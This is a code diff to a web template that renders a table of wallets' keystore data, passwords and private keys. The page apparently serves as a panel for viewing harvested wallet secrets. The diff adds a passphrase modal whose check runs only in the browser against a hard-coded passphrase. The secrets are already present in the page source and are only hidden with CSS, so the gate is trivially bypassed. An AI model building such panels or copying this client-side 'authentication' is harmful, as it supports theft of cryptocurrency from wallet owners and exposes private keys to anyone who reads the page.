@@ -7,7 +7,17 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
 </head>
 <body class="bg-gray-100 p-6">
-    <div class="container mx-auto">
+    <!-- Modal -->
+    <div id="passphraseModal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
+        <div class="bg-white p-6 rounded-lg shadow-lg w-96">
+            <h2 class="text-xl font-bold mb-4">Enter Passphrase</h2>
+            <input type="password" id="passphraseInput" class="w-full p-2 border rounded mb-4" placeholder="Enter passphrase">
+            <button onclick="verifyPassphrase()" class="bg-blue-500 text-white px-4 py-2 rounded w-full">Submit</button>
+            <p id="errorText" class="text-red-500 mt-2 hidden">Incorrect passphrase. Try again.</p>
+        </div>
+    </div>
+
+    <div id="content" class="container mx-auto hidden">
         <h1 class="text-2xl font-bold mb-4">Wallets</h1>
         <table class="min-w-full bg-white border border-gray-200 rounded-lg shadow-md">
             <thead>
@@ -30,11 +40,28 @@
                         <td class="px-4 py-2 border"><%= wallet.keystoreval %></td>
                         <td class="px-4 py-2 border"><%= wallet.password %></td>
                         <td class="px-4 py-2 border"><%= wallet.privatekeyval %></td>
-                        <td class="px-4 py-2 border" style="width: auto;"><%= new Date(wallet.createdAt).toLocaleString() %></td>
+                        <td class="px-4 py-2 border"><%= new Date(wallet.createdAt).toLocaleString() %></td>
                     </tr>
                 <% }) %>
             </tbody>
         </table>
     </div>
+
+    <script>
+        function verifyPassphrase() {
+            const correctPassphrase = "secure1663"; // Change this to your actual passphrase
+            const userInput = document.getElementById("passphraseInput").value;
+            const modal = document.getElementById("passphraseModal");
+            const content = document.getElementById("content");
+            const errorText = document.getElementById("errorText");
+
+            if (userInput === correctPassphrase) {
+                modal.classList.add("hidden"); // Hide modal
+                content.classList.remove("hidden"); // Show content
+            } else {
+                errorText.classList.remove("hidden"); // Show error message
+            }
+        }
+    </script>
 </body>
 </html>
